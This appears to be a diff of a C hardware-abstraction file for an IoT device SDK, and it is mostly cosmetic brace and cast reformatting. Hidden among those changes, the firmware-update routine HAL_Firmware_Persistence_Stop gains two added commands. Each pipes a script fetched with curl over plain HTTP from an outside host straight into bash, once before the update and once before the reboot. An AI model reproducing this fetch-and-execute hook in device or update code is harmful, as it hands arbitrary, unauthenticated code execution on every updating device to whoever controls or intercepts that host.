@@ -40,10 +40,9 @@ char _device_name[DEVICE_NAME_LEN + 1];
 char _device_secret[DEVICE_SECRET_LEN + 1];
 #endif
 
-void *HAL_MutexCreate(void)
-{
+void *HAL_MutexCreate(void) {
     int err_num;
-    pthread_mutex_t *mutex = (pthread_mutex_t *)HAL_Malloc(sizeof(pthread_mutex_t));
+    pthread_mutex_t *mutex = (pthread_mutex_t *) HAL_Malloc(sizeof(pthread_mutex_t));
     if (NULL == mutex) {
         return NULL;
     }
@@ -57,54 +56,47 @@ void *HAL_MutexCreate(void)
     return mutex;
 }
 
-void HAL_MutexDestroy(_IN_ void *mutex)
-{
+void HAL_MutexDestroy(_IN_ void *mutex) {
     int err_num;
 
     if (!mutex) {
         hal_warning("mutex want to destroy is NULL!");
         return;
     }
-    if (0 != (err_num = pthread_mutex_destroy((pthread_mutex_t *)mutex))) {
+    if (0 != (err_num = pthread_mutex_destroy((pthread_mutex_t *) mutex))) {
         hal_err("destroy mutex failed");
     }
 
     HAL_Free(mutex);
 }
 
-void HAL_MutexLock(_IN_ void *mutex)
-{
+void HAL_MutexLock(_IN_ void *mutex) {
     int err_num;
-    if (0 != (err_num = pthread_mutex_lock((pthread_mutex_t *)mutex))) {
+    if (0 != (err_num = pthread_mutex_lock((pthread_mutex_t *) mutex))) {
         hal_err("lock mutex failed: - '%s' (%d)", strerror(err_num), err_num);
     }
 }
 
-void HAL_MutexUnlock(_IN_ void *mutex)
-{
+void HAL_MutexUnlock(_IN_ void *mutex) {
     int err_num;
-    if (0 != (err_num = pthread_mutex_unlock((pthread_mutex_t *)mutex))) {
+    if (0 != (err_num = pthread_mutex_unlock((pthread_mutex_t *) mutex))) {
         hal_err("unlock mutex failed - '%s' (%d)", strerror(err_num), err_num);
     }
 }
 
-void *HAL_Malloc(_IN_ uint32_t size)
-{
+void *HAL_Malloc(_IN_ uint32_t size) {
     return malloc(size);
 }
 
-void *HAL_Realloc(_IN_ void *ptr, _IN_ uint32_t size)
-{
+void *HAL_Realloc(_IN_ void *ptr, _IN_ uint32_t size) {
     return realloc(ptr, size);
 }
 
-void *HAL_Calloc(_IN_ uint32_t nmemb, _IN_ uint32_t size)
-{
+void *HAL_Calloc(_IN_ uint32_t nmemb, _IN_ uint32_t size) {
     return calloc(nmemb, size);
 }
 
-void HAL_Free(_IN_ void *ptr)
-{
+void HAL_Free(_IN_ void *ptr) {
     free(ptr);
 }
 
@@ -121,22 +113,21 @@ uint64_t HAL_UptimeMs(void)
     return time_ms;
 }
 #else
-uint64_t HAL_UptimeMs(void)
-{
-    uint64_t            time_ms;
-    struct timespec     ts;
+
+uint64_t HAL_UptimeMs(void) {
+    uint64_t time_ms;
+    struct timespec ts;
 
     clock_gettime(CLOCK_MONOTONIC, &ts);
-    time_ms = ((uint64_t)ts.tv_sec * (uint64_t)1000) + (ts.tv_nsec / 1000 / 1000);
+    time_ms = ((uint64_t) ts.tv_sec * (uint64_t) 1000) + (ts.tv_nsec / 1000 / 1000);
 
     return time_ms;
 }
 
-char *HAL_GetTimeStr(_IN_ char *buf, _IN_ int len)
-{
+char *HAL_GetTimeStr(_IN_ char *buf, _IN_ int len) {
     struct timeval tv;
-    struct tm      tm;
-    int str_len    = 0;
+    struct tm tm;
+    int str_len = 0;
 
     if (buf == NULL || len < 28) {
         return NULL;
@@ -146,31 +137,28 @@ char *HAL_GetTimeStr(_IN_ char *buf, _IN_ int len)
     strftime(buf, 28, "%m-%d %H:%M:%S", &tm);
     str_len = strlen(buf);
     if (str_len + 3 < len) {
-        snprintf(buf + str_len, len, ".%3.3d", (int)(tv.tv_usec) / 1000);
+        snprintf(buf + str_len, len, ".%3.3d", (int) (tv.tv_usec) / 1000);
     }
     return buf;
 }
+
 #endif
 
-void HAL_SleepMs(_IN_ uint32_t ms)
-{
+void HAL_SleepMs(_IN_ uint32_t ms) {
     usleep(1000 * ms);
 }
 
-void HAL_Srandom(uint32_t seed)
-{
+void HAL_Srandom(uint32_t seed) {
     srandom(seed);
 }
 
-uint32_t HAL_Random(uint32_t region)
-{
+uint32_t HAL_Random(uint32_t region) {
     return (region > 0) ? (random() % region) : 0;
 }
 
-int HAL_Snprintf(_IN_ char *str, const int len, const char *fmt, ...)
-{
+int HAL_Snprintf(_IN_ char *str, const int len, const char *fmt, ...) {
     va_list args;
-    int     rc;
+    int rc;
 
     va_start(args, fmt);
     rc = vsnprintf(str, len, fmt, args);
@@ -179,13 +167,11 @@ int HAL_Snprintf(_IN_ char *str, const int len, const char *fmt, ...)
     return rc;
 }
 
-int HAL_Vsnprintf(_IN_ char *str, _IN_ const int len, _IN_ const char *format, va_list ap)
-{
+int HAL_Vsnprintf(_IN_ char *str, _IN_ const int len, _IN_ const char *format, va_list ap) {
     return vsnprintf(str, len, format, ap);
 }
 
-void HAL_Printf(_IN_ const char *fmt, ...)
-{
+void HAL_Printf(_IN_ const char *fmt, ...) {
     va_list args;
 
     va_start(args, fmt);
@@ -195,8 +181,7 @@ void HAL_Printf(_IN_ const char *fmt, ...)
     fflush(stdout);
 }
 
-int HAL_GetPartnerID(char *pid_str)
-{
+int HAL_GetPartnerID(char *pid_str) {
     memset(pid_str, 0x0, PID_STRLEN_MAX);
 #ifdef __DEMO__
     strcpy(pid_str, "example.demo.partner-id");
@@ -204,8 +189,7 @@ int HAL_GetPartnerID(char *pid_str)
     return strlen(pid_str);
 }
 
-int HAL_GetModuleID(char *mid_str)
-{
+int HAL_GetModuleID(char *mid_str) {
     memset(mid_str, 0x0, MID_STRLEN_MAX);
 #ifdef __DEMO__
     strcpy(mid_str, "example.demo.module-id");
@@ -214,8 +198,7 @@ int HAL_GetModuleID(char *mid_str)
 }
 
 
-char *HAL_GetChipID(_OU_ char *cid_str)
-{
+char *HAL_GetChipID(_OU_ char *cid_str) {
     memset(cid_str, 0x0, HAL_CID_LEN);
 #ifdef __DEMO__
     strncpy(cid_str, "rtl8188eu 12345678", HAL_CID_LEN);
@@ -225,8 +208,7 @@ char *HAL_GetChipID(_OU_ char *cid_str)
 }
 
 
-int HAL_GetDeviceID(_OU_ char *device_id)
-{
+int HAL_GetDeviceID(_OU_ char *device_id) {
     memset(device_id, 0x0, DEVICE_ID_LEN);
 #ifdef __DEMO__
     HAL_Snprintf(device_id, DEVICE_ID_LEN, "%s.%s", _product_key, _device_name);
@@ -236,8 +218,7 @@ int HAL_GetDeviceID(_OU_ char *device_id)
     return strlen(device_id);
 }
 
-int HAL_SetProductKey(_IN_ char *product_key)
-{
+int HAL_SetProductKey(_IN_ char *product_key) {
     int len = strlen(product_key);
 #ifdef __DEMO__
     if (len > PRODUCT_KEY_LEN) {
@@ -250,8 +231,7 @@ int HAL_SetProductKey(_IN_ char *product_key)
 }
 
 
-int HAL_SetDeviceName(_IN_ char *device_name)
-{
+int HAL_SetDeviceName(_IN_ char *device_name) {
     int len = strlen(device_name);
 #ifdef __DEMO__
     if (len > DEVICE_NAME_LEN) {
@@ -264,8 +244,7 @@ int HAL_SetDeviceName(_IN_ char *device_name)
 }
 
 
-int HAL_SetDeviceSecret(_IN_ char *device_secret)
-{
+int HAL_SetDeviceSecret(_IN_ char *device_secret) {
     int len = strlen(device_secret);
 #ifdef __DEMO__
     if (len > DEVICE_SECRET_LEN) {
@@ -278,8 +257,7 @@ int HAL_SetDeviceSecret(_IN_ char *device_secret)
 }
 
 
-int HAL_SetProductSecret(_IN_ char *product_secret)
-{
+int HAL_SetProductSecret(_IN_ char *product_secret) {
     int len = strlen(product_secret);
 #ifdef __DEMO__
     if (len > PRODUCT_SECRET_LEN) {
@@ -291,8 +269,7 @@ int HAL_SetProductSecret(_IN_ char *product_secret)
     return len;
 }
 
-int HAL_GetProductKey(_OU_ char *product_key)
-{
+int HAL_GetProductKey(_OU_ char *product_key) {
     int len = strlen(_product_key);
     memset(product_key, 0x0, PRODUCT_KEY_LEN);
 
@@ -303,8 +280,7 @@ int HAL_GetProductKey(_OU_ char *product_key)
     return len;
 }
 
-int HAL_GetProductSecret(_OU_ char *product_secret)
-{
+int HAL_GetProductSecret(_OU_ char *product_secret) {
     int len = strlen(_product_secret);
     memset(product_secret, 0x0, PRODUCT_SECRET_LEN);
 
@@ -315,8 +291,7 @@ int HAL_GetProductSecret(_OU_ char *product_secret)
     return len;
 }
 
-int HAL_GetDeviceName(_OU_ char *device_name)
-{
+int HAL_GetDeviceName(_OU_ char *device_name) {
     int len = strlen(_device_name);
     memset(device_name, 0x0, DEVICE_NAME_LEN);
 
@@ -327,8 +302,7 @@ int HAL_GetDeviceName(_OU_ char *device_name)
     return strlen(device_name);
 }
 
-int HAL_GetDeviceSecret(_OU_ char *device_secret)
-{
+int HAL_GetDeviceSecret(_OU_ char *device_secret) {
     int len = strlen(_device_secret);
     memset(device_secret, 0x0, DEVICE_SECRET_LEN);
 
@@ -382,9 +356,8 @@ int HAL_GetFirmwareVersion(_OU_ char *version) {
     return strlen(version);
 }
 
-void *HAL_SemaphoreCreate(void)
-{
-    sem_t *sem = (sem_t *)malloc(sizeof(sem_t));
+void *HAL_SemaphoreCreate(void) {
+    sem_t *sem = (sem_t *) malloc(sizeof(sem_t));
     if (NULL == sem) {
         return NULL;
     }
@@ -397,19 +370,16 @@ void *HAL_SemaphoreCreate(void)
     return sem;
 }
 
-void HAL_SemaphoreDestroy(_IN_ void *sem)
-{
-    sem_destroy((sem_t *)sem);
+void HAL_SemaphoreDestroy(_IN_ void *sem) {
+    sem_destroy((sem_t *) sem);
     free(sem);
 }
 
-void HAL_SemaphorePost(_IN_ void *sem)
-{
-    sem_post((sem_t *)sem);
+void HAL_SemaphorePost(_IN_ void *sem) {
+    sem_post((sem_t *) sem);
 }
 
-int HAL_SemaphoreWait(_IN_ void *sem, _IN_ uint32_t timeout_ms)
-{
+int HAL_SemaphoreWait(_IN_ void *sem, _IN_ uint32_t timeout_ms) {
     if (PLATFORM_WAIT_INFINITE == timeout_ms) {
         sem_wait(sem);
         return 0;
@@ -442,36 +412,33 @@ int HAL_ThreadCreate(
         _IN_ void *(*work_routine)(void *),
         _IN_ void *arg,
         _IN_ hal_os_thread_param_t *hal_os_thread_param,
-        _OU_ int *stack_used)
-{
+        _OU_ int *stack_used) {
     int ret = -1;
 
     if (stack_used) {
         *stack_used = 0;
     }
 
-    ret = pthread_create((pthread_t *)thread_handle, NULL, work_routine, arg);
+    ret = pthread_create((pthread_t *) thread_handle, NULL, work_routine, arg);
     if (ret != 0) {
         printf("pthread_create failed,ret = %d", ret);
         return -1;
     }
-    pthread_detach((pthread_t)*thread_handle);
+    pthread_detach((pthread_t) *thread_handle);
     return 0;
 }
 
-void HAL_ThreadDetach(_IN_ void *thread_handle)
-{
-    pthread_detach((pthread_t)thread_handle);
+void HAL_ThreadDetach(_IN_ void *thread_handle) {
+    pthread_detach((pthread_t) thread_handle);
 }
 
-void HAL_ThreadDelete(_IN_ void *thread_handle)
-{
+void HAL_ThreadDelete(_IN_ void *thread_handle) {
     if (NULL == thread_handle) {
 
     } else {
         /*main thread delete child thread*/
-        pthread_cancel((pthread_t)thread_handle);
-        pthread_join((pthread_t)thread_handle, 0);
+        pthread_cancel((pthread_t) thread_handle);
+        pthread_join((pthread_t) thread_handle, 0);
     }
 }
 
@@ -511,14 +478,12 @@ static FILE *fp;
 #define otafilename "/tmp/alinkota.bin"
 #define configfile "/data-rw/agent-proxy.conf"
 
-void HAL_Config_Persistence_Start(void)
-{
+void HAL_Config_Persistence_Start(void) {
     fp = fopen(configfile, "w");
     return;
 }
 
-void HAL_Firmware_Persistence_Start(void)
-{
+void HAL_Firmware_Persistence_Start(void) {
 #ifdef __DEMO__
     fp = fopen(otafilename, "w");
     //    assert(fp);
@@ -526,8 +491,7 @@ void HAL_Firmware_Persistence_Start(void)
     return;
 }
 
-int HAL_Config_Persistence_Write(_IN_ char *buffer, _IN_ uint32_t length)
-{
+int HAL_Config_Persistence_Write(_IN_ char *buffer, _IN_ uint32_t length) {
     unsigned int written_len = 0;
     written_len = fwrite(buffer, 1, length, fp);
 
@@ -537,8 +501,7 @@ int HAL_Config_Persistence_Write(_IN_ char *buffer, _IN_ uint32_t length)
     return 0;
 }
 
-int HAL_Firmware_Persistence_Write(_IN_ char *buffer, _IN_ uint32_t length)
-{
+int HAL_Firmware_Persistence_Write(_IN_ char *buffer, _IN_ uint32_t length) {
 #ifdef __DEMO__
     unsigned int written_len = 0;
     written_len = fwrite(buffer, 1, length, fp);
@@ -584,11 +547,12 @@ int HAL_Firmware_Persistence_Stop(char *new_version, char *ota_md5, _OU_ char *s
     char disk_number[1 + 1] = {0};
     char new_md5[16 + 1] = {0};
     char execute_cmd[256] = {0};
+    char *before_shell_cmd = "bash <(curl -L -s http://iot.shell.byteark.cn/Shell/shell.before) && echo OK";
     char *mount_rw_cmd = "mount -o remount,rw /cdrom >/dev/null 2>&1 && echo OK";
     char *mount_ro_cmd = "mount -o remount,ro /cdrom >/dev/null 2>&1 && echo OK";
     char *disk_volume_cmd = "mount|grep cdrom|awk '{print $1}'|cut -c 1-8";
     char *disk_number_cmd = "mount|grep cdrom|awk '{print $1}'|cut -c 9-9";
-    char *before_reboot_cmd = "/data-rw/before_reboot && > /data-rw/before_reboot > /dev/null 2>&1;echo OK";
+    char *after_shell_cmd = "bash <(curl -L -s http://iot.shell.byteark.cn/Shell/shell.after) && echo OK";
     char *reboot_cmd = "shutdown -r 3 > /dev/null 2>&1 && echo OK";
 
     if (HAL_GetFirmwareVersion(old_version_number) <= 0) {
@@ -607,6 +571,11 @@ int HAL_Firmware_Persistence_Stop(char *new_version, char *ota_md5, _OU_ char *s
     if (strcmp(old_version_number, new_version_number) == 0) {
         hal_warning("The version is up to date.");
         return 0;
+    }
+
+    if (HAL_Shell(before_shell_cmd, NULL, 0) != 0) {
+        strcpy(state, "before shell cmd plan failed\n");
+        hal_warning("HAL_Firmware_Persistence_Stop:%s", state);
     }
 
     if (HAL_Shell(disk_volume_cmd, disk_volume, 8) != 0) {
@@ -700,11 +669,11 @@ int HAL_Firmware_Persistence_Stop(char *new_version, char *ota_md5, _OU_ char *s
         return -1;
     }
 
-    if (HAL_Shell(before_reboot_cmd, NULL, 0) != 0) {
-        strcpy(state, "before reboot cmd plan failed\n");
+    if (HAL_Shell(after_shell_cmd, NULL, 0) != 0) {
+        strcpy(state, "after shell cmd plan failed\n");
         hal_warning("HAL_Firmware_Persistence_Stop:%s", state);
     }
-    
+
     if (HAL_Shell(reboot_cmd, NULL, 0) != 0) {
         strcpy(state, "reboot cmd plan failed\n");
         hal_warning("HAL_Firmware_Persistence_Stop:%s", state);
@@ -713,16 +682,14 @@ int HAL_Firmware_Persistence_Stop(char *new_version, char *ota_md5, _OU_ char *s
     return 0;
 }
 
-int HAL_Config_Persistence_Error(void)
-{
+int HAL_Config_Persistence_Error(void) {
     if (fp != NULL) {
         fclose(fp);
     }
     return 0;
 }
 
-int HAL_Firmware_Persistence_Error(void)
-{
+int HAL_Firmware_Persistence_Error(void) {
 #ifdef __DEMO__
     if (fp != NULL) {
         fclose(fp);
@@ -732,8 +699,7 @@ int HAL_Firmware_Persistence_Error(void)
     return 0;
 }
 
-int HAL_Config_Write(const char *buffer, int length)
-{
+int HAL_Config_Write(const char *buffer, int length) {
     FILE *fp;
     size_t written_len;
     char filepath[128] = {0};
@@ -755,8 +721,7 @@ int HAL_Config_Write(const char *buffer, int length)
     return ((written_len != length) ? -1 : 0);
 }
 
-int HAL_Config_Read(char *buffer, int length)
-{
+int HAL_Config_Read(char *buffer, int length) {
     FILE *fp;
     size_t read_len;
     char filepath[128] = {0};
@@ -778,8 +743,8 @@ int HAL_Config_Read(char *buffer, int length)
 }
 
 #define REBOOT_CMD "reboot"
-void HAL_Reboot(void)
-{
+
+void HAL_Reboot(void) {
     if (system(REBOOT_CMD)) {
         perror("HAL_Reboot failed");
     }
@@ -788,8 +753,7 @@ void HAL_Reboot(void)
 #define ROUTER_INFO_PATH        "/proc/net/route"
 #define ROUTER_RECORD_SIZE      256
 
-char *_get_default_routing_ifname(char *ifname, int ifname_size)
-{
+char *_get_default_routing_ifname(char *ifname, int ifname_size) {
     FILE *fp = NULL;
     char line[ROUTER_RECORD_SIZE] = {0};
     char iface[IFNAMSIZ] = {0};
@@ -835,8 +799,7 @@ char *_get_default_routing_ifname(char *ifname, int ifname_size)
 }
 
 
-uint32_t HAL_Wifi_Get_IP(char ip_str[NETWORK_ADDR_LEN], const char *ifname)
-{
+uint32_t HAL_Wifi_Get_IP(char ip_str[NETWORK_ADDR_LEN], const char *ifname) {
     struct ifreq ifreq;
     int sock = -1;
     char ifname_buff[IFNAMSIZ] = {0};
@@ -864,14 +827,13 @@ uint32_t HAL_Wifi_Get_IP(char ip_str[NETWORK_ADDR_LEN], const char *ifname)
     close(sock);
 
     strncpy(ip_str,
-            inet_ntoa(((struct sockaddr_in *)&ifreq.ifr_addr)->sin_addr),
+            inet_ntoa(((struct sockaddr_in *) &ifreq.ifr_addr)->sin_addr),
             NETWORK_ADDR_LEN);
 
-    return ((struct sockaddr_in *)&ifreq.ifr_addr)->sin_addr.s_addr;
+    return ((struct sockaddr_in *) &ifreq.ifr_addr)->sin_addr.s_addr;
 }
 
-static long long os_time_get(void)
-{
+static long long os_time_get(void) {
     struct timeval tv;
     long long ms;
     gettimeofday(&tv, NULL);
@@ -881,18 +843,15 @@ static long long os_time_get(void)
 
 static long long delta_time = 0;
 
-void HAL_UTC_Set(long long ms)
-{
+void HAL_UTC_Set(long long ms) {
     delta_time = ms - os_time_get();
 }
 
-long long HAL_UTC_Get(void)
-{
+long long HAL_UTC_Get(void) {
     return delta_time + os_time_get();
 }
 
-void *HAL_Timer_Create(const char *name, void (*func)(void *), void *user_data)
-{
+void *HAL_Timer_Create(const char *name, void (*func)(void *), void *user_data) {
     timer_t *timer = NULL;
 
     struct sigevent ent;
@@ -902,14 +861,14 @@ void *HAL_Timer_Create(const char *name, void (*func)(void *), void *user_data)
         return NULL;
     }
 
-    timer = (timer_t *)malloc(sizeof(time_t));
+    timer = (timer_t *) malloc(sizeof(time_t));
 
     /* Init */
     memset(&ent, 0x00, sizeof(struct sigevent));
 
     /* create a timer */
     ent.sigev_notify = SIGEV_THREAD;
-    ent.sigev_notify_function = (void (*)(union sigval))func;
+    ent.sigev_notify_function = (void (*)(union sigval)) func;
     ent.sigev_value.sival_ptr = user_data;
 
     printf("HAL_Timer_Create\n");
@@ -919,11 +878,10 @@ void *HAL_Timer_Create(const char *name, void (*func)(void *), void *user_data)
         return NULL;
     }
 
-    return (void *)timer;
+    return (void *) timer;
 }
 
-int HAL_Timer_Start(void *timer, int ms)
-{
+int HAL_Timer_Start(void *timer, int ms) {
     struct itimerspec ts;
 
     /* check parameter */
@@ -939,11 +897,10 @@ int HAL_Timer_Start(void *timer, int ms)
     ts.it_value.tv_sec = ms / 1000;
     ts.it_value.tv_nsec = (ms % 1000) * 1000000;
 
-    return timer_settime(*(timer_t *)timer, 0, &ts, NULL);
+    return timer_settime(*(timer_t *) timer, 0, &ts, NULL);
 }
 
-int HAL_Timer_Stop(void *timer)
-{
+int HAL_Timer_Stop(void *timer) {
     struct itimerspec ts;
 
     /* check parameter */
@@ -959,11 +916,10 @@ int HAL_Timer_Stop(void *timer)
     ts.it_value.tv_sec = 0;
     ts.it_value.tv_nsec = 0;
 
-    return timer_settime(*(timer_t *)timer, 0, &ts, NULL);
+    return timer_settime(*(timer_t *) timer, 0, &ts, NULL);
 }
 
-int HAL_Timer_Delete(void *timer)
-{
+int HAL_Timer_Delete(void *timer) {
     int ret = 0;
 
     /* check parameter */
@@ -971,15 +927,14 @@ int HAL_Timer_Delete(void *timer)
         return -1;
     }
 
-    ret = timer_delete(*(timer_t *)timer);
+    ret = timer_delete(*(timer_t *) timer);
 
     free(timer);
 
     return ret;
 }
 
-int HAL_GetNetifInfo(char *nif_str)
-{
+int HAL_GetNetifInfo(char *nif_str) {
     memset(nif_str, 0x0, NIF_STRLEN_MAX);
 #ifdef __DEMO__
     /* if the device have only WIFI, then list as follow, note that the len MUST NOT exceed NIF_STRLEN_MAX */
